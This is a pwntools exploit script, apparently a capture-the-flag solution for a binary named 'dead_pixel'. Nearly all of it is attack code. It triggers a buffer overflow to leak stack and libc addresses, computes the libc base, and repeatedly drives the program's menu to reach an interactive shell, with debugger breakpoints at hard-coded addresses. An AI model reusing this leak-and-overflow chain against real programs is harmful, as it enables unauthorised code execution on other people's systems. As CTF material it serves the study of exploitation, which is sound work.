#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('dead_pixel_patched', checksec=False)
libc = ELF('libs/libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*overflow_buffer()+354
        b*0x555555554af8
        # inside escapse reality
        b*0x555555554f0c
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

# glitch energy > 100k to get shell
def bof(addr, load):
    slna(b'> ', 3)
    sa(b'Target address: ', addr)
    sa(b'Payload: ', load)

def exploit_engine():
    slna(b'> ', 2)


bof(b'hihi evil', b'a'*8)

ru(b'a'*8)
stack_leak = u64(r(6) + b'\0\0')
info(f'stack leak: {hex(stack_leak)}')

bof(p64(stack_leak), b'a'*0x18)

ru(b'a'*0x18)

libc_leak = u64(r(6) + b'\0\0')
libc.address = libc_leak-0x955d2

info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

for i in range(500):
    exploit_engine()

for i in range(100):
    pad = f'{i}'.encode()
    bof(pad, pad)

p.interactive()
